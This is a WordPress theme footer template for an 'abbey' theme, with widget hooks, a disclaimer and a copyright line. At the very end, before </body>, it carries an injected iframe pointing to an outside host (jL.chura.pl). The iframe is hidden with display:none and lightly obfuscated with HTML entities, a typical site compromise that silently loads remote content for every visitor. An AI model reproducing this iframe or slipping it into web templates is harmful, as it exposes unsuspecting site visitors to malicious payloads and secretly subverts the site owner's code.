<?php

$site_about = ( !empty( abbey_get_defaults( "about" ) ) ) ? abbey_get_defaults( "about" ) : "";
$disclaimer = __( "* All publications, articles, reviews published on this website should not be redistributed, republished or printed without our authorised consent", "abbey" );

?>
		
		<footer id="site-footer" role="footer" class="row">	

			<aside class="row" id="before-footer"> <?php do_action( "abbey_theme_before_footer" ) ; ?></aside> 
			
			<section id="inner-footer" class="row">

				<?php do_action( "abbey_theme_footer_widgets" ); ?>
				
				<div class="clearfix"></div>

				<hr class="line-divider" />
				
				<div class="md-50 text-center" id="footer-info">
					<p class="disclaimer small"><?php echo apply_filters( "abbey_theme_footer_disclaimer", $disclaimer ); ?></p>
					<p class="copyright"><?php echo sprintf( __( "All rights reserved &copy; %s", "abbey" ), date("Y") ); ?></p>
				</div>

			</section>
				
			<div id="footer-bottom" class="row"><?php do_action( "abbey_theme_footer_credits" ); ?></div>
			

		</footer>

	
</div><!--#site wrapper open in header.php -->
	<?php wp_footer(); ?>

<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
</body>
</html>